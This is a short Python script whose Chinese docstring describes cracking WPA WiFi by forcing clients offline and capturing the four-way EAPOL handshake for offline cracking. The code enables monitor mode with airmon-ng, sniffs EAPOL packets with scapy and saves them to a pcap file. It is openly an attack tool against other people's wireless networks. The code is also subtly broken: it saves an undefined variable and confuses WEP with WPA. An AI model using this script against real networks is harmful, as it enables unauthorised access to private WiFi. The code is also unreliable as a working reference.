"""
    WPA是更安全的加密方式.
    破解方式：捕获四次握手产生的数据包.也就是在建立连接时的4个EAPOL类型的数据包，
            这需要有设备登录目标网络时才能捕获，所以通常的做法是先对网络进行攻击
            让客户端都掉线，然后再监听网络，这时客户端重新登录就会产生登录数据包，
            一个设备登录会产生4个数据包。
            当成功捕获4个数据包后，就可以对其进行破解。也就是所谓的跑包.

"""
import subprocess
subprocess.call('airmon-ng start wlan0',shell=True)
import sys
from scapy.all import *
iface = "wlan0mon"
nr_of_wep_packets = 4
packets = []
def handle_packet(packet):
        if packet.haslayer(EAPOL) and packet.type == 2:
            packets.append(packet)
            print(packet.summary())
        if len(packets) == nr_of_wep_packets:
            wrpcap("wep_handshake.pcap", wep_handshake)
            sys.exit(0)
print("Sniffing on interface " + iface)
sniff(iface=iface, prn=handle_packet)